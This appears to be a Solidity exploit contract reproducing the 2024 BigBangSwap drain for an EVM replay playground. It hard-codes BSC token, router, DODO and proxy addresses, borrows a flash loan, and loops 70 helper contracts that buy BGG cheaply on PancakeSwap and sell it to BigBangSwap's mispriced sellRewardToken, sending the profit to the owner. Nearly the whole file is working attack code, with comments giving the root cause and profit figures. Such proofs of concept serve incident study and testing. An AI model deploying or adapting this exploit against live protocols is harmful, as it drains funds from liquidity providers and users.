// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-BigBangSwap).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is itself the DODO flash-loan borrower and receives the
// `DPPFlashLoanCall` callback, so there is no standalone "exploit contract" the
// original test deploys). This contract is a faithful, self-contained copy of
// that inline attack (testExploit + DPPFlashLoanCall + the AttackContract helper,
// deployed fresh 70 times inside the callback) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/BigBangSwap_exp.sol.
//
// Root cause: BigBangSwap's sellRewardToken() prices the BGG a seller hands in
// against BigBangSwap's OWN (rich, ~0.475 BUSD/BGG) AMM pool, while the same BGG
// can be bought ~13x cheaper on the parallel PancakeSwap pool (~0.037 BUSD/BGG).
// Looping "buy cheap on PancakeSwap, sell rich to sellRewardToken" 70 times
// drains ~5,085 BUSD of protocol/LP value for ~3,985 BUSD net attacker profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface ITransparentUpgradeableProxy {
    function sellRewardToken(uint256 amount) external;
}

contract BigBangSwapDrain {
    IERC20 constant BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPAdvanced constant DODO = IDPPAdvanced(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    ITransparentUpgradeableProxy constant TransparentUpgradeableProxy =
        ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // step 0: borrow 50 BUSD (0 fee) from the DODO pool; the callback below does the drain.
    function run() external {
        BUSD.approve(address(Router), type(uint256).max);
        BGG.approve(address(TransparentUpgradeableProxy), type(uint256).max);

        DODO.flashLoan(50 * 1e18, 0, address(this), new bytes(1));

        // sweep the final BUSD profit to the top-level caller
        BUSD.transfer(owner, BUSD.balanceOf(address(this)));
    }

    // DODO's flash-loan callback: 70 iterations of "buy cheap on PancakeSwap,
    // sell rich to sellRewardToken", each in a fresh AttackContract.
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(DODO), "only DODO");
        for (uint256 i = 0; i < 70; i++) {
            AttackContract attackContract = new AttackContract();
            BUSD.transfer(address(attackContract), 15 * 1e18);
            attackContract.Attack();
            attackContract.Claim();
        }
        // repay the 0-fee flash loan
        BUSD.transfer(address(DODO), 50 * 1e18);
    }

    fallback() external payable {}
    receive() external payable {}
}

contract AttackContract {
    IERC20 constant BGG = IERC20(0xaC4d2F229A3499F7E4E90A5932758A6829d69CFF);
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    ITransparentUpgradeableProxy constant TransparentUpgradeableProxy =
        ITransparentUpgradeableProxy(0xa45D4359246DBD523Ab690Bef01Da06B07450030);

    address owner;

    constructor() {
        owner = msg.sender;
        BUSD.approve(address(Router), type(uint256).max);
        BGG.approve(address(TransparentUpgradeableProxy), type(uint256).max);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can perform this action");
        _;
    }

    // buy BGG cheap on PancakeSwap, then sell it rich to sellRewardToken
    function Attack() external onlyOwner {
        BUSDTOTOKEN();
        TransparentUpgradeableProxy.sellRewardToken(BGG.balanceOf(address(this)));
    }

    function Claim() external onlyOwner {
        BUSD.transfer(owner, BUSD.balanceOf(address(this)));
    }

    function BUSDTOTOKEN() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(BGG);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSD.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
